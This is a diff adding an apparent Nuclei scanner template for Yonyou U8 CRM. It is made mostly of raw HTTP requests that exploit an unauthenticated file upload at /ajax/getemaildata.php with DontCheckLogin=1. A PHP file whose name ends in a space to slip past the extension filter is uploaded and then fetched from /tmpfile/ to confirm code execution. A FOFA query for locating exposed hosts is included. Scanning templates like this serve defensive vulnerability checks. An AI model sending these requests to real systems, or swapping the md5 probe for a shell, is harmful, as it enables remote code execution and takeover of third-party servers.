@@ -1,0 +1,42 @@
+id: crm
+info:
+  name: 用友U8 crm客户关系管理
+  author: mike
+  severity: info
+  description: 用友U8客户关系管理全面解决方案是基于中国企业最佳营销管理实践，更符合中国企业营销管理特点，客户关系管理的整合营销平台
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="用友U8CRM"
+http:
+  - raw:
+      - |
+        POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+        Connection: close
+        Content-Length: 205
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundarykS5RKgl8t3nwInMQ
+        Content-Disposition: form-data; name="file"; filename="mike.php "
+        Content-Type: text/plain
+
+        <?php echo md5(1234);?>
+
+        ------WebKitFormBoundarykS5RKgl8t3nwInMQ 
+
+      - |
+        GET /tmpfile/upd80A0.tmp.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
